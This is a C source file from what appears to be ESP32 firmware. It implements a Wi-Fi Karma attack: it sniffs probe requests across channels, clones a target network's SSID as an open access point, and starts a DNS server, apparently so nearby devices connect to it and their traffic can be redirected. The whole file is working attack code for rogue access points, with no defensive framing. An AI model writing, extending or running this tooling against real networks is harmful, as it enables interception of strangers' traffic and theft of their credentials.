#include <string.h>
#include "esp_log.h"
#include "wifiMng.h"
#include "karma_attack.h"
#include "sniffer.h"
#include "dns.h"
#include "target.h"


/* Store target information */
static const char *TAG = "KARMA_ATTACK";


void karma_attack_set_target(const target_info_t *target)
{
    if(target == NULL) return;

    target_info_t *karma_target = target_get(TARGET_INFO_KARMA_ATTACK);
    memcpy(karma_target, target, sizeof(target_info_t));

    /* Stop sniffer */
    wifi_sniffer_stop_channel_hopping();
    wifi_stop_sniffing();

    /* Start DNS Server */
    dns_server_start();

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = karma_target->channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
                    .capable = true
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&karma_target->ssid);
    wifi_ap_clone(&wifi_config, NULL);

    ESP_LOGI(TAG, "Karma target set to SSID: %s on Channel %d.", karma_target->ssid, karma_target->channel);
}


void karma_attack_stop(void)
{
    /* Stop DNS Server */
    dns_server_stop();
    /* Stop sniffer and beacon tracking */
    wifi_stop_beacon_tracking();
    wifi_stop_sniffing();
    /* Wait engine stop */
    vTaskDelay(pdMS_TO_TICKS(1000));
    /* Restore original hotspot */
    wifi_start_softap();
    ESP_LOGI(TAG, "Karma attack stopped.");
}


void karma_attack_probes_scan_start(void)
{
    wifi_start_sniffing(NULL, SNIFF_MODE_ATTACK_KARMA);
    wifi_sniffer_start_channel_hopping();
    ESP_LOGI(TAG, "Karma attack probe scan started.");
}


void karma_attack_probes_scan_stop(void)
{
    wifi_sniffer_stop_channel_hopping();
    wifi_stop_sniffing();
    ESP_LOGI(TAG, "Karma attack probe scan stopped.");
}